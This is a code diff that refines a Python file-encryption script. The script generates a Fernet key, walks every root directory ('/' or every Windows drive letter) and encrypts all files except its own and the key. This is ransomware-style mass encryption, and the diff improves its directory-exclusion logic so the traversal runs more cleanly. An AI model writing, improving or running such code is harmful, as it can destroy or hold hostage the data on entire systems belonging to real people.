@@ -39,11 +39,9 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as key_file:
     key_file.write(key)
 
-# Exclude specific files
+# Exclude specific files and directories
 EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}
-
-# Get the Python environment path
-python_env_path = os.path.dirname(os.path.dirname(sys.executable))
+EXCLUDE_DIRS = {os.path.abspath(os.path.dirname(sys.executable)), os.path.abspath(os.path.dirname(__file__))}
 
 # Function to encrypt a file
 def encrypt_file(file_path):
@@ -60,9 +58,11 @@ def encrypt_file(file_path):
 # Function to get all files from a root directory
 def get_all_files(root_dir, exclude_paths):
     for root, _, files in os.walk(root_dir):
+        if any(os.path.commonpath([root, exclude]) == exclude for exclude in exclude_paths):
+            continue
         for file in files:
             file_path = os.path.join(root, file)
-            if os.path.basename(file_path) not in EXCLUDE_FILES and not any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
+            if os.path.basename(file_path) not in EXCLUDE_FILES:
                 yield file_path
 
 # Function to process files in chunks
@@ -100,7 +100,7 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
-    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__))]
+    exclude_paths = EXCLUDE_DIRS
     
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
@@ -113,7 +113,8 @@ def main():
 
 if __name__ == "__main__":
     main()
-   
+
+
 
 
 
